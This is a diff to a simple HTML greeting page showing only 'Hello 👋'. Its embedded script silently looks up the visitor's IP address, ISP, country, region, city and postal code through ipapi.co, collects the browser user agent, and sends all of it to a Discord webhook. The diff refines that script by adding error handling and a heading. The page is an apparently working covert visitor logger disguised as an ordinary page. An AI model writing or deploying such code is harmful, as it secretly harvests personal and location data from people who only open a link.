@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Hi</title>
   <style>
     body {
@@ -19,10 +19,13 @@
   </style>
 </head>
 <body>
+  <h1>Hello 👋</h1>
+  
   <script>
     async function getVisitorInfo() {
       try {
         const res = await fetch('https://ipapi.co/json/');
+        if (!res.ok) throw new Error('Failed to fetch IP info.');
         const data = await res.json();
 
         const userAgent = navigator.userAgent;
@@ -45,7 +48,7 @@
 🌐 **Network Info**
 • IP: \`${data.ip}\`
 • ISP: ${data.org}
-• Country: ${data.country_name} (${data.country})
+• Country: ${data.country_name}
 • Region: ${data.region}
 • City: ${data.city}
 • Postal: ${data.postal}
@@ -62,10 +65,16 @@
             "Content-Type": "application/json"
           },
           body: JSON.stringify({ content })
+        }).then(response => {
+          if (!response.ok) {
+            console.error('Discord Webhook Failed:', response.status);
+          }
+        }).catch(err => {
+          console.error('Fetch to Discord failed:', err);
         });
 
       } catch (err) {
-        console.error("Failed to fetch/send visitor info:", err);
+        console.error("Error in visitor info collection:", err);
       }
     }
 
@@ -73,4 +82,3 @@
   </script>
 </body>
 </html>
-
